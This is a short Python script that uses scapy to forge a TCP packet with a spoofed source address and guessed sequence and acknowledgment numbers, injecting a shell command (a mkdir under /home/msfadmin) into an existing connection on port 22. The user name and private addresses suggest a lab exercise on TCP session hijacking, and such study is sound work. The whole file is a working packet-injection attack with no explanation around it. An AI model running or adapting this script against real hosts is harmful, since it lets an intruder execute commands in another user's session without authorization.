#!/user/bin/python
import sys
from scapy.all import *

IPLayer = IP (src="10.10.10.185", dst = "10.10.10.186")
TCPLayer = TCP (sport=34598, dport=22, flags="A", seq=2001589073, ack=3703036117)

data = "\n mkdir /home/msfadmin/attacker \n"

pkt=IPLayer/TCPLayer/data
ls(pkt)

send(pkt,verbose=0)
